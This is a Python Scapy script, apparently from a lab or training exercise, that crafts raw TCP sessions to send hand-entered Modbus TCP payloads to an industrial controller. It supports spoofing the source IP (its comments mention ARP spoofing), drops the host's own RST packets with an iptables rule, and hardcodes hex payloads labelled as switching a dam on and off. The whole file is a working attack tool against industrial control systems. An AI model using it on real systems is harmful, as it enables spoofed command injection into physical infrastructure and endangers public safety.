#!/usr/bin/python

############################################
# 使用 Scapy 發送手動輸入的 Modbus TCP Payloads
# 可以偽造來源，若使用 非自身 IP ，需 ARP Spoofing
# 需 sudo 權限
# Author: @dinlon5566 2024/06/27
############################################

from scapy.all import *
from time import sleep
import subprocess

target_ip = "192.168.1.5"  # Target IP
source_ip = "192.168.1.66"  # Source IP
target_port = 502           # Modbus port

# 避免被自動送 RST 中斷，程式中會用 iptables 擋掉
# 如果意外中斷用 # sudo iptables -L 看有沒有殘黨
# sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.1.66 -j DROP # 192.168.1.66 改我的 IP

def setup_iptables(source_ip):
    try:
        # 用來添加iptables規則，阻止發送來自特定IP的RST包
        subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-p', 'tcp',
                       '--tcp-flags', 'RST', 'RST', '-s', source_ip, '-j', 'DROP'], check=True)
        print(f"iptables規則設置完成，已阻止從{source_ip}發送RST包")
    except subprocess.CalledProcessError as e:
        print("[ERROR]設置iptables規則時發生錯誤:", e)

def reset_iptables(source_ip):
    try:
        # 刪除先前添加的iptables規則
        subprocess.run(['sudo', 'iptables', '-D', 'OUTPUT', '-p', 'tcp',
                       '--tcp-flags', 'RST', 'RST', '-s', source_ip, '-j', 'DROP'], check=True)
        print(f"已清除iptables規則，不再阻止從{source_ip}發送RST包")
    except subprocess.CalledProcessError as e:
        print("[ERROR]清除iptables規則時發生錯誤:", e)


# 這邊是發送Modbus TCP Payloads的函數
# 修改時需要注意ACK-SEQ的值，以避免中斷

def sendModbusPayloads(cmd, target_ip="192.168.1.5", source_ip="192.168.1.20", target_port=502):
    # TCP 三向交握
    ip = IP(dst=target_ip, src=source_ip)
    syn = TCP(
        sport=RandShort(),
        dport=target_port,
        flags='S',
        seq=100
    )

    # 發送SYN封包，接收SYN-ACK
    syn_ack = sr1(ip/syn)

    # 創建ACK封包
    ack = TCP(
        sport=syn_ack.dport,
        dport=target_port,
        flags='A',
        seq=syn_ack.ack,
        ack=syn_ack.seq + 1
    )

    # 發送ACK封包以完成連線
    send(ip/ack)

    # 初始化序列號和確認號
    seq = ack.seq
    ack_num = ack.ack
    trans_id = 0
    
    print(f"---------\nSent: \n{cmd}\n---------\n")
    modbus_data = bytes.fromhex(cmd)
    modbus_packet = ip/TCP(
        sport=ack.sport,
        dport=target_port,
        flags='PA',
        seq=seq,
        ack=ack_num
    )/modbus_data

    # 發送Modbus TCP packet
    response = sr1(modbus_packet)
    seq += len(modbus_data)
    ack_num = response.seq + len(response.load)  # 改進，加上接收到的資料長度

    print(response.show())

    # 收到後回覆一個ACK
    ack = TCP(
        sport=response.dport,
        dport=target_port,
        flags='A',
        seq=response.ack,  # 改為使用對方的確認號作為序列號
        ack=ack_num        # 確認號現在應包括接收到的負載長度
    )
    send(ip/ack)


    # 發送FIN封包以開始關閉連線
    fin = TCP(
        sport=ack.sport,
        dport=target_port,
        flags='FA',  # 使用FIN+ACK標誌來開始結束連接
        seq=seq,
        ack=ack_num
    )
    fin_ack = sr1(ip/fin)  # 發送FIN並等待對方的ACK

    # 等待對方的FIN
    last_ack = TCP(
        sport=fin_ack.dport,
        dport=target_port,
        flags='A',
        seq=fin_ack.ack,
        ack=fin_ack.seq + 1
    )
    send(ip/last_ack)  # 發送最後的ACK以完成四次交握


# 創建Modbus TCP封包
# nothing   00e80000000b01420200060000f0960001
# 水壩start 6dca0000000e01420300090000006400010001ff
# 水壩off   6dca0000000e0142030009000000640001000100
print("水壩start 6dca0000000e01420300090000006400010001ff")
print("水壩off   6dca0000000e0142030009000000640001000100")

setup_iptables(source_ip)

try:
    while True:
        cmd=input("請輸入Modbus TCP Payload: ")
        sendModbusPayloads(cmd, target_ip, source_ip, target_port)
except Exception as e:
    print("[ERROR]傳送Modbus資料過程中發生錯誤:", e)

reset_iptables(source_ip)

